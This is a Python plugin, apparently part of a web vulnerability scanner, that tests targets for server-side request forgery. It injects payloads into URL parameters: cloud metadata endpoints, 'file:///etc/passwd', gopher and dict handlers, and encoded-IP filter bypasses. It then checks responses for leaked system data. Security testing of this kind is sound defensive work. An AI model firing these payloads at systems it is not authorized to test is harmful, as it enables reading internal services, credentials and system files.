"""
SSRF Detection Plugin - Tests for Server-Side Request Forgery vulnerabilities
"""

import aiohttp
import urllib.parse
from typing import List, Dict, Any
from plugins.base import BasePlugin, PluginResult, PluginCategory, Severity


class SSRFDetector(BasePlugin):
    """Server-Side Request Forgery vulnerability scanner"""

    @property
    def category(self) -> PluginCategory:
        return PluginCategory.VULN_SCAN

    @property
    def description(self) -> str:
        return "Detects Server-Side Request Forgery (SSRF) vulnerabilities"

    def __init__(self, config: Any, logger: Any):
        super().__init__(config, logger)

        # SSRF test payloads
        self.payloads = [
            # Internal IPs
            "http://127.0.0.1",
            "http://127.0.0.1:80",
            "http://127.0.0.1:8080",
            "http://127.0.0.1:22",
            "http://localhost",
            "http://localhost:80",
            "http://0.0.0.0",
            "http://[::1]",

            # Private network ranges
            "http://192.168.1.1",
            "http://10.0.0.1",
            "http://172.16.0.1",

            # Cloud metadata endpoints
            "http://169.254.169.254",  # AWS metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal",  # GCP metadata
            "http://169.254.169.254/metadata/v1/",  # DigitalOcean

            # Bypass techniques
            "http://127.1",
            "http://127.0.1",
            "http://2130706433",  # Decimal IP for 127.0.0.1
            "http://017700000001",  # Octal IP
            "http://0x7f000001",  # Hex IP

            # URL encoding
            "http://127.0.0.1%2F",
            "http://127.0.0.1%00",

            # Protocol handlers
            "file:///etc/passwd",
            "gopher://127.0.0.1",
            "dict://127.0.0.1",
        ]

        # Indicators of successful SSRF
        self.success_indicators = [
            "root:",
            "instance-id",
            "ami-id",
            "hostname",
            "metadata",
            "private",
            "local"
        ]

    async def run(self, target: Any) -> PluginResult:
        """Execute SSRF detection"""
        result = PluginResult(
            plugin_name=self.name,
            target=target.value,
            success=False
        )

        try:
            url = self._normalize_url(target.value)
            self.log_info(f"Testing for SSRF vulnerabilities on {url}")

            # Test for SSRF
            vulnerable_params = await self._test_ssrf(url)

            result.data['tested_payloads'] = len(self.payloads)
            result.data['vulnerable_parameters'] = vulnerable_params
            result.success = True

            # Report findings
            for ssrf_info in vulnerable_params:
                result.add_vulnerability(
                    title="Server-Side Request Forgery (SSRF) Vulnerability",
                    description=f"SSRF vulnerability found in parameter '{ssrf_info['parameter']}'",
                    severity=Severity.CRITICAL,
                    evidence=f"Parameter: {ssrf_info['parameter']}, Payload: {ssrf_info['payload']}, "
                             f"Evidence: {ssrf_info['evidence']}",
                    cve="CWE-918",
                    remediation="Implement whitelist-based URL validation. Disable unnecessary protocols. "
                               "Use DNS resolution checks. Implement network segmentation. "
                               "Avoid passing user input directly to URL fetching functions.",
                    url=ssrf_info['url']
                )

            if vulnerable_params:
                self.log_vuln(f"Found {len(vulnerable_params)} SSRF vulnerabilities")
            else:
                self.log_info("No SSRF vulnerabilities detected")

        except Exception as e:
            result.add_error(str(e))
            self.log_error(f"SSRF detection failed: {e}")

        return result

    async def _test_ssrf(self, url: str) -> List[Dict[str, Any]]:
        """Test for SSRF vulnerabilities"""
        vulnerabilities = []

        # Parse URL to get parameters
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        # Also look for common SSRF parameter names
        ssrf_params = ['url', 'uri', 'path', 'dest', 'redirect', 'link', 'file', 'load', 'fetch']

        if not params:
            # Try adding common SSRF parameters
            params = {param: ['http://example.com'] for param in ssrf_params[:3]}

        timeout = aiohttp.ClientTimeout(total=self.timeout + 5)

        async with aiohttp.ClientSession(timeout=timeout) as session:
            for param_name in params.keys():
                self.log_debug(f"Testing parameter: {param_name}")

                # Get baseline
                try:
                    baseline = await self._get_response(session, url)
                except:
                    baseline = None

                # Test each payload
                for payload in self.payloads:
                    if self.config.scan_mode.stealth and len(vulnerabilities) > 0:
                        break

                    # Inject payload
                    test_url = self._inject_payload(url, param_name, payload)

                    try:
                        response = await self._get_response(session, test_url)

                        if response:
                            # Check for indicators
                            evidence = self._check_ssrf_indicators(response['body'], baseline)

                            if evidence:
                                vulnerabilities.append({
                                    'parameter': param_name,
                                    'payload': payload,
                                    'url': test_url,
                                    'evidence': evidence
                                })
                                self.log_vuln(f"SSRF vulnerability found in {param_name}")
                                break

                        # Rate limiting
                        if self.config.scan_mode.delay > 0:
                            import asyncio
                            await asyncio.sleep(self.config.scan_mode.delay)

                    except Exception as e:
                        # Timeout or connection error might indicate successful SSRF
                        if "timeout" in str(e).lower() or "connection" in str(e).lower():
                            if "127.0.0.1" in payload or "localhost" in payload:
                                vulnerabilities.append({
                                    'parameter': param_name,
                                    'payload': payload,
                                    'url': test_url,
                                    'evidence': 'Connection behavior change (possible internal network access)'
                                })
                                self.log_vuln(f"Possible SSRF in {param_name} (behavior-based)")
                                break

        return vulnerabilities

    async def _get_response(self, session: aiohttp.ClientSession, url: str) -> Dict[str, Any]:
        """Get HTTP response"""
        try:
            async with session.get(url, ssl=False, allow_redirects=False) as response:
                body = await response.text()
                return {
                    'status': response.status,
                    'body': body,
                    'length': len(body),
                    'headers': dict(response.headers)
                }
        except Exception as e:
            raise e

    def _inject_payload(self, url: str, param_name: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        # Inject payload
        params[param_name] = [payload]

        # Rebuild URL
        new_query = urllib.parse.urlencode(params, doseq=True)
        new_parsed = parsed._replace(query=new_query)

        return urllib.parse.urlunparse(new_parsed)

    def _check_ssrf_indicators(self, response_body: str, baseline: Dict[str, Any]) -> str:
        """Check for SSRF indicators in response"""

        # Check for success indicators
        for indicator in self.success_indicators:
            if indicator.lower() in response_body.lower():
                return f"Found indicator: {indicator}"

        # Check for significant response difference
        if baseline:
            length_diff = abs(len(response_body) - baseline['length'])
            if length_diff > 500:  # Significant difference
                return "Significant response difference from baseline"

        return ""

    def _normalize_url(self, target: str) -> str:
        """Normalize URL"""
        if not target.startswith('http'):
            return f"http://{target}"
        return target

    def validate_target(self, target: Any) -> bool:
        """Validate if target is suitable for SSRF testing"""
        return target.type == 'url'
